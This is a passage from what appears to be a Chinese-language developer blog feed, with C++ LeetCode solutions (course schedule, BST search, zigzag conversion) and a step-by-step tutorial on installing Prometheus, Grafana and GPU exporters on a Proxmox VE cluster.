class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">findOrder</span><span class="params">(<span class="type">int</span> numCourses, vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; prerequisites)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> m = numCourses;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">visited</span><span class="params">(m, <span class="number">0</span>)</span></span>; <span class="comment">// 0:unvisited, 1:visiting, 2: finished</span></span><br><span class="line">        stack&lt;<span class="type">int</span>&gt; finishStack; </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Construct Adj list</span></span><br><span class="line">        AdjList.<span class="built_in">resize</span>(m);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> &amp;pre: prerequisites)&#123;</span><br><span class="line">            AdjList[pre[<span class="number">1</span>]].<span class="built_in">push_back</span>(pre[<span class="number">0</span>]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// First DFS</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;m;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(visited[i]== <span class="number">0</span> )&#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="built_in">hasCycle</span>(i, visited, finishStack)) <span class="keyword">return</span> &#123;&#125;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Push finished node to stack</span></span><br><span class="line">       vector&lt;<span class="type">int</span>&gt; returnVector;</span><br><span class="line">       <span class="keyword">while</span>(!finishStack.<span class="built_in">empty</span>())&#123;</span><br><span class="line">            <span class="type">int</span>  vertex = finishStack.<span class="built_in">top</span>();</span><br><span class="line">            finishStack.<span class="built_in">pop</span>();</span><br><span class="line">            returnVector.<span class="built_in">push_back</span>(vertex);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> returnVector;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>Topological Sort 的重點就是要先執行一次 DFS 然後將按照完成時間將節點由finish時間晚到finsh時間早的順序吐出 (先將越早完成四周節點搜尋的節點push到stack)</p></blockquote><p>首先來看 <code>findOrder</code> 題目中給的參數 <code>prerequisites</code> 並不是 Adjacency List 因此會需要將輸入參數轉換成 Adjacency List 我們宣告了一個global list <code>AdjList</code> 來儲存。另外在函數內部宣告了整數的 <code>visited</code> 陣列來保存節點造訪狀態， <code>0</code> 代表未造訪, <code>1</code> 代表造訪中, <code>2</code> 代表造訪完畢。另外宣告一個Stack  <code>finishStack</code> 按照順序保存造訪完畢節點。</p><p>DFS 的部分可以用來判斷 cycle 因此我們將函數命名為 <code>hasCycle</code>，每次造訪節點就會將對應的 <code>visited</code> 標注為 <code>1</code> (<code>visited[v] = 1;</code>) 接著需要去迭代當前節點的四周鄰居，這裡就需要透過剛剛建構得 <code>AdjList</code>  來去知道當前節點 <code>v</code> 的四周接鄰節點有哪些。</p><p>如果 <code>visited[neighbor] == 0</code> 代表節點尚未訪問，繼續進行DFS</p><p>如果 <code>visited[neighbor] == 1</code> 表示 <code>neighbor</code> 已經在 <strong>訪問中</strong> (也就是DFS 還沒結束)，這代表圖中會有一條 <strong>回邊 (back edge)</strong></p><p>舉例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">numCourses = 2;</span><br><span class="line">prerequisites = &#123;&#123;1, 0&#125;, &#123;0, 1&#125;&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">0 → 1</span><br><span class="line">↑   ↓</span><br><span class="line">1 ← 0</span><br></pre></td></tr></table></figure><ul><li><code>0</code> 訪問中 (<code>visited[0]=1</code>)</li><li>進入 <code>1</code> (<code>visited[1]=1</code>)</li><li><code>1</code> 指向 <code>0</code> ， 但是 <code>0</code> 是訪問中 (<code>visited[0]=1</code>)</li><li>發現有環，回傳 <code>true</code></li></ul><p><strong>所以只要發現有 <code>visited[neighbor]=1</code> 就代表該 <code>neighbor</code> 已經正在DFS 存在於 Call Stack 當中，已經開始循環。</strong> 如果 <code>visited[neighbor] == 2</code> 代表完成訪問，以該節點進行的DFS已經結束，這時可以將該節點push 到 <code>finishStack</code> 中。</p><p>所以回到函數 <code>findOrder</code> 一旦DFS 時最後回傳回來是 <code>true</code> 就代表有環，直接回傳空陣列，如果沒有環，那就代表 <code>finishStack</code> 中已經有排序好的節點，將stack中元素依序Pop出來存進回傳陣列中，最後回傳陣列即可。</p><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/210/result.jpeg"></p><h1 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h1><h2 id="時間複雜度"><a href="#時間複雜度" class="headerlink" title="時間複雜度"></a>時間複雜度</h2><ul><li>建立Adjacency List: $O(E)$, <code>prerequisites</code> 中共有 $E$ 條邊，每條邊都要插入 <code>AdjList</code> 所以是 $O(E)$</li><li>遍歷所有課程：$O(V)$, 一共 $V$ 個課程，最壞情況下會對每個課程執行一次 DFS</li><li>DFS：$O(V+E)$ 每個節點都只會被訪問一次，而每條邊也都只會訪問一次</li><li>Stack 轉陣列：$O(V)$</li></ul><p>整體而言會是 $O(V+E)$</p><h2 id="空間複雜度"><a href="#空間複雜度" class="headerlink" title="空間複雜度"></a>空間複雜度</h2><ul><li><code>AdjList</code> $O(V+E)$</li><li><code>visited</code> $O(V)$</li><li>stack $O(V)$</li></ul><p>整體會是 $O(V+E)$</p><hr>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> C++ </tag>
            
            <tag> Medium </tag>
            
            <tag> Graph </tag>
            
            <tag> DFS </tag>
            
            <tag> Cycle </tag>
            
            <tag> Topological Sort </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>在 BST 中進行搜尋 | Easy | LeetCode#700. Search in a Binary Search Tree</title>
      <link href="/posts/e21e131f.html"/>
      <url>/posts/e21e131f.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/700/question.jpeg"></p><ul><li>題目難度: <code>Easy</code></li><li>題目描述: 題目給定一個Binary Search Tree，每個樹節點都有值 <code>val</code>，請在BST找到以該 <code>val</code> 作為值的節點，如果沒找到就回傳 <code>null</code></li></ul><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><p>BST 的特性就是左邊節點 &lt; 右邊節點，因此只要跟每個節點比較輸入的   <code>val</code> ，如果 <code>val</code> 大於當前節點就去查找其右子樹的 root，如果小於就給左子樹的root，就這樣遞迴查找，如果碰到 Leaf 後還是沒有找到就回傳 <code>nullptr</code></p><blockquote><p>  但注意某些題目的定義會是 <code>&lt;=</code></p></blockquote><h2 id="我的解法"><a href="#我的解法" class="headerlink" title="我的解法"></a>我的解法</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     TreeNode *right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() : val(0), left(nullptr), right(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) : val(x), left(nullptr), right(nullptr) &#123;&#125;ㄑㄑ</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x, TreeNode *left, TreeNode *right) : val(x), left(left), right(right) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">TreeNode* <span class="title">searchBST</span><span class="params">(TreeNode* root, <span class="type">int</span> val)</span></span>&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">nullptr</span>) <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(root-&gt;val &gt; val)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">searchBST</span>(root-&gt;left, val);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(root-&gt;val &lt; val)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">searchBST</span>(root-&gt;right, val);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> root;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/700/result.jpeg"></p><h1 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h1><p>時間複雜度<br>$O(LogN)$: $N$ 個節點每次都會比大小進入其左或右子樹，因此不會每個節點都去查找，因此會是 $O(LogN)$</p><p>空間複雜度<br>$O(H)$: 沒有使用到額外的空間變數，所以空間複雜度由遞迴深度決定，遞迴深度這裡等於樹高 $H$</p><hr>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> Easy </tag>
            
            <tag> C++ </tag>
            
            <tag> Tree </tag>
            
            <tag> Binary Tree </tag>
            
            <tag> Binary Search Tree </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Proxmox VE 叢集部署 Promethues 以及 Grafana</title>
      <link href="/posts/a6822388.html"/>
      <url>/posts/a6822388.html</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在以前建立的 Proxmox VE 從集中，需要定期搜集GPU 功耗資訊作為腳本的判斷依據，因此需要 Promethues 進行資訊搜集。</p><h1 id="節點背景資訊"><a href="#節點背景資訊" class="headerlink" title="節點背景資訊"></a>節點背景資訊</h1><div class="note info flat"><p>IP CIDR: <code>172.25.166.139/24</code><br>CPU(s) 4 x Intel(R) Core(TM) i3-8100 CPU @ 3.60GHz (1 Socket)<br>Kernel Version Linux 6.8.4-2-pve (2024-04-10T17:36Z)</p></div><h1 id="安裝-Promethues"><a href="#安裝-Promethues" class="headerlink" title="安裝 Promethues"></a>安裝 Promethues</h1><p>建立 Promethues 使用者</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo groupadd --system prometheus</span><br><span class="line">sudo useradd -s /sbin/nologin --system -g prometheus prometheus</span><br></pre></td></tr></table></figure><p>建立 Promethues 必要目錄</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir /var/lib/prometheus</span><br><span class="line">for i in rules rules.d files_sd; do mkdir -p /etc/prometheus/$&#123;i&#125;; done</span><br></pre></td></tr></table></figure><p>在 <code>tmp</code> 建立暫時用的目錄 <code>prometheus</code> 用於下載檔案，並下載最新版本的 Prometheus</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p /tmp/prometheus &amp;&amp; cd /tmp/prometheus</span><br><span class="line">curl -s https://api.github.com/repos/prometheus/prometheus/releases/latest \</span><br><span class="line">  | grep browser_download_url \</span><br><span class="line">  | grep linux-amd64 \</span><br><span class="line">  | cut -d &#x27;&quot;&#x27; -f 4 \</span><br><span class="line">  | wget -qi -</span><br></pre></td></tr></table></figure><p>解壓縮檔案、移動設定檔、操作完後刪除暫時用的目錄</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">tar xvf prometheus*.tar.gz</span><br><span class="line">cd prometheus*/</span><br><span class="line">mv prometheus promtool /usr/local/bin/</span><br><span class="line">mv prometheus.yml  /etc/prometheus/prometheus.yml</span><br><span class="line">mv consoles/ console_libraries/ /etc/prometheus/</span><br><span class="line"></span><br><span class="line">cd ~/</span><br><span class="line">rm -rf /tmp/prometheus</span><br></pre></td></tr></table></figure><p>建立 systemd 設定檔</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">sudo tee /etc/systemd/system/prometheus.service&lt;&lt;EOF</span><br><span class="line"></span><br><span class="line">[Unit]</span><br><span class="line">Description=Prometheus</span><br><span class="line">Documentation=https://prometheus.io/docs/introduction/overview/</span><br><span class="line">Wants=network-online.target</span><br><span class="line">After=network-online.target</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">Type=simple</span><br><span class="line">User=prometheus</span><br><span class="line">Group=prometheus</span><br><span class="line">ExecReload=/bin/kill -HUP $MAINPID</span><br><span class="line">ExecStart=/usr/local/bin/prometheus \</span><br><span class="line">  --config.file=/etc/prometheus/prometheus.yml \</span><br><span class="line">  --storage.tsdb.path=/var/lib/prometheus \</span><br><span class="line">  --web.console.templates=/etc/prometheus/consoles \</span><br><span class="line">  --web.console.libraries=/etc/prometheus/console_libraries \</span><br><span class="line">  --web.listen-address=0.0.0.0:9090 \</span><br><span class="line">  --web.external-url=</span><br><span class="line"></span><br><span class="line">SyslogIdentifier=prometheus</span><br><span class="line">Restart=always</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure><p>透過 <code>chown</code> 將剛才建立所有目錄的 owner 設定成 Prometheus</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">for i in rules rules.d files_sd; do sudo chown -R prometheus:prometheus /etc/prometheus/$&#123;i&#125;; done</span><br><span class="line">for i in rules rules.d files_sd; do sudo chmod -R 775 /etc/prometheus/$&#123;i&#125;; done</span><br><span class="line">sudo chown -R prometheus:prometheus /var/lib/prometheus/</span><br></pre></td></tr></table></figure><p>接著就能載入 Prometheus 設定檔，並啟動Prometheus 服務以及開機服務</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl daemon-reload</span><br><span class="line">sudo systemctl start prometheus</span><br><span class="line">sudo systemctl enable prometheus</span><br></pre></td></tr></table></figure><blockquote><p>做到這步驟，透過瀏覽器存取節點得 9090 port 應該就可以存取到 Promethues 的頁面</p></blockquote><p><img src="/img/Prometheus/prometheus-1.jpeg"></p><h1 id="安裝-Prometheus-Exporter"><a href="#安裝-Prometheus-Exporter" class="headerlink" title="安裝 Prometheus Exporter"></a>安裝 Prometheus Exporter</h1><blockquote><p>Prometheus Exporter 主要用於在節點上主動將節點資訊導出到特定的 Service 上來讓 Prometheus進行存取。因此這邊需求是在叢集中每個節點都需要安裝</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt install python3 python3-pip</span><br><span class="line">pip3 install prometheus-pve-exporter --break-system-packages</span><br></pre></td></tr></table></figure><p>這裡使用 <code>--break-system-packages</code> 的原因在於，PVE預設啟用了 <code>PEP 668</code>，這會限制你在全域環境中使用 <code>pip3</code> 安裝 Python 套件，因為這表示這個 Python 環境是由系統管理的。透過這個參數可以繞過這項限制。</p><p>之後要建立認證檔，讓 prometheus-pve-exporter 可以登入 PVE，這裡的認證方式是使用 Proxmox VE 中的 API Token，還沒建立的話需要事先建立</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">sudo tee /etc/prometheus/pve.yml&lt;&lt;EOF</span><br><span class="line"></span><br><span class="line">default:</span><br><span class="line">  user: &quot;root@pam&quot;</span><br><span class="line">  token_name: &quot;&lt;YOUR TOKEN NAME&gt;&quot;</span><br><span class="line">  token_value: &quot;&lt;YOUR TOKEN VALUE&gt;&quot;</span><br><span class="line">  verify_ssl: false</span><br><span class="line">  port: 8006</span><br><span class="line"></span><br><span class="line">EOF</span><br></pre></td></tr></table></figure><p>可以前往 <code>http://&lt;Service IP&gt;:9221/pve</code> 確認是否可以取得系統資訊，並且也可以前往 Prometheus 的 dashboard 查看 target health</p><p><img src="/img/Prometheus/pro-2.png"></p><details class="toggle" style="border: 1px solid bg"><summary class="toggle-button" style="background-color: bg;color: color">建立 API Token </summary><div class="toggle-content"><p>在 Proxmox 網頁界面中，創建一個 API Token。</p><ol><li>進入用戶管理 (<code>Datacenter</code> → <code>Permissions</code> → <code>API Token</code>)。</li><li>為某個用戶創建 Token，並分配適當的權限（例如 Read-Only）</li><li>記錄 <code>Token-ID</code> 和 <code>Token-Secret</code>。</li></ol><p><img src="/img/Prometheus/apiToken.png"></p></div></details><p>接著建立  systemd 的設定檔，方便操作該服務</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">sudo tee /etc/systemd/system/prometheus-pve-exporter.service&lt;&lt;EOF</span><br><span class="line">[Unit]</span><br><span class="line">Description=Prometheus exporter for Proxmox VE</span><br><span class="line">Documentation=https://github.com/znerol/prometheus-pve-exporter</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">Restart=always</span><br><span class="line">User=prometheus</span><br><span class="line">ExecStart=/usr/local/bin/pve_exporter --config.file=/etc/prometheus/pve.yml</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure><p>啟用 <code>prometheus-pve-exporter</code> 服務</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">systemctl daemon-reload</span><br><span class="line">systemctl start prometheus-pve-exporter</span><br><span class="line">systemctl enable prometheus-pve-exporter</span><br></pre></td></tr></table></figure><blockquote><p>當叢集所有的 exporter 都安裝完畢後，一定要去控制節點(裝有 Promethus 的節點)當中的 <code>/etc/prometheus/prometheus.yml</code> 中在 targets 中加入 worker nodes 的 <code>ip addr</code> </p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">- job_name: &#x27;proxmox&#x27;</span><br><span class="line">  metrics_path: /pve</span><br><span class="line">  static_configs:</span><br><span class="line">  - targets: </span><br><span class="line">     - &lt;WorkerNode IP Address&gt;:9221</span><br></pre></td></tr></table></figure><p><img src="/img/Prometheus/pro-config.png"></p><h1 id="安裝-Grafana"><a href="#安裝-Grafana" class="headerlink" title="安裝 Grafana"></a>安裝 Grafana</h1><p>添加官方 Repo</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install -y software-properties-common</span><br><span class="line">sudo add-apt-repository &quot;deb https://packages.grafana.com/oss/deb stable main&quot;</span><br><span class="line">wget -q -O - https://packages.grafana.com/gpg.key | sudo apt-key add -</span><br></pre></td></tr></table></figure><p>安裝 Grafana</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install grafana -y</span><br></pre></td></tr></table></figure><p>啟用 Grafana</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl start grafana-server</span><br><span class="line">sudo systemctl enable grafana-server</span><br></pre></td></tr></table></figure><p>瀏覽器打開 <code>http://&lt;Controller Node IP&gt;:3000</code>  帳密會是： admin&#x2F; admin (首次登入好後會提示更改帳密)</p><p><img src="/img/Prometheus/gr.jpeg"></p><p>接著要將 Grafana 連接到 Prometheus，需要從 <strong>&#x2F;home&#x2F;connections&#x2F;data sources&#x2F;</strong> 選擇 <strong>Add Data Source</strong> 接著選擇 Prometheus，在頁面中需要指定Service Name 跟 Prometheus 的URL </p><p><img src="/img/Prometheus/gr-2.jpeg"></p><p>接著就是需要尋找好用的 Dashboard，根據我的需求有查到下面幾個不錯的</p><blockquote><p>NVIDIA GPU: <a href="https://grafana.com/grafana/dashboards/6387-gpus/">https://grafana.com/grafana/dashboards/6387-gpus/</a><br><a href="https://www.leadergpu.com/articles/524-collecting-gpu-metrics-with-grafana">https://www.leadergpu.com/articles/524-collecting-gpu-metrics-with-grafana</a><br>Power Monitoring: <a href="https://grafana.com/grafana/dashboards/20173-poweropen/">https://grafana.com/grafana/dashboards/20173-poweropen/</a></p></blockquote><p>我選擇 NVIDIA GPU Metrics 這個 Dashboard，選擇 <strong>Download JSON</strong></p><p><img src="/img/Prometheus/gr-3.jpeg"></p><p>接著在 Grafana 中的 Dashboard 選擇 <strong>New</strong> 然後 <strong>Import Dashboard</strong> 並指定來源，最後按下 <strong>import</strong></p><p><img src="/img/Prometheus/gr-4.jpeg"></p><p>這時顯示得儀表板都還會是 <strong>No Data</strong>，這是因為還沒有安裝一個重要的元件 <strong>Nvidia GPU Exporter</strong></p><h1 id="安裝-NVIDIA-GPU-Exporter"><a href="#安裝-NVIDIA-GPU-Exporter" class="headerlink" title="安裝 NVIDIA GPU Exporter"></a>安裝 NVIDIA GPU Exporter</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/utkuozdemir/nvidia_gpu_exporter/releases/download/v1.2.1/nvidia-gpu-exporter_1.2.1_linux_amd64.deb</span><br><span class="line">sudo dpkg -i nvidia-gpu-exporter_1.2.1_linux_amd64.deb</span><br></pre></td></tr></table></figure><p>接著修改 <code>/etc/prometheus/prometheus.yml</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">    - job_name: &#x27;nvidia&#x27;</span><br><span class="line">    scrape_interval: 5s</span><br><span class="line">    static_configs:</span><br><span class="line">    - targets: </span><br><span class="line">      - &#x27;WORKERNODE_1_IP:9835&#x27;</span><br><span class="line">      - ....</span><br></pre></td></tr></table></figure><p>接著重新啟動 prometheus 服務</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl restart prometheus</span><br></pre></td></tr></table></figure><p>查看 Prometheus 可以發現所有安裝 NVIDIA GPU Exporter 的節點，都能夠從 Prometheus 查看到了</p><p><img src="/img/Prometheus/ex-1.jpeg"></p><p>接著就可以發現到 Grafana 成功抓到 GPU 資料了</p><p><img src="/img/Prometheus/ex-2.jpeg"></p><blockquote><p>注意：每台節點都必須先有縣卡驅動才有辦法正確抓到資料</p></blockquote><blockquote><p>接著需要解決的議題就是顯卡直通，需要讓PVE上的VM能夠存取到顯示卡</p></blockquote><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://codychen.me/2021/38/proxmox-%E9%80%8F%E9%81%8E-prometheus-%E5%91%88%E7%8F%BE%E5%9C%A8-grafana/">https://codychen.me/2021/38/proxmox-%E9%80%8F%E9%81%8E-prometheus-%E5%91%88%E7%8F%BE%E5%9C%A8-grafana/</a><br><a href="https://samynitsche.de/3-monitoring-proxmox-with-prometheus-and-grafana">https://samynitsche.de/3-monitoring-proxmox-with-prometheus-and-grafana</a></p><hr>]]></content>
      
      
      <categories>
          
          <category> 實作紀錄 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Proxmox VE </tag>
            
            <tag> Infrastructure </tag>
            
            <tag> Promethues </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>之字形轉換 | Medium | LeetCode#6. Zigzag Conversion</title>
      <link href="/posts/bb246426.html"/>
      <url>/posts/bb246426.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/6/question.jpeg"></p><ul><li>題目難度: <code>Medium</code></li><li>題目描述: 題目給定一個字串 <code>s</code> 假設是 <code>PAYPALISHIRING</code>，需要根據給定的列數 <code>numRows</code> 來用之字形 (Zigzag) 形式來呈現，並且逐列讀取字元後輸出字串 <code>PAHNAPLSIIGYIR</code></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">P   A   H   N</span><br><span class="line">A P L S I I G</span><br><span class="line">Y   I   R</span><br></pre></td></tr></table></figure><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><p>這裡的之字形會是先往下，碰到底部後再往右上方移動，移動到頂部後再往下直到把所有的字元都寫完。之後再逐行輸出。一開始的想法就是用個2維陣列按照之字形來儲存字串值，然後按照跟題目一樣的規則來填充到2維陣列中，</p><h2 id="我的解法"><a href="#我的解法" class="headerlink" title="我的解法"></a>我的解法</h2><p>但後來發現其實用一維度陣列就好，由於可以型態是字串，所以原先2為陣列的其他列都可以加入到對應行的後面，比較節省空間。</p><p>Ex.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">row 0 | &quot;P   A   H   N&quot;</span><br><span class="line">row 1 | &quot;A P L S I I G&quot;</span><br><span class="line">row 2 | &quot;Y   I   R&quot;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">string <span class="title">convert</span><span class="params">(string s, <span class="type">int</span> numRows)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(numRows==<span class="number">1</span>) <span class="keyword">return</span> s;</span><br><span class="line">        <span class="function">vector&lt;string&gt; <span class="title">matrix</span><span class="params">(min(numRows, (<span class="type">int</span>)s.length()))</span></span>;</span><br><span 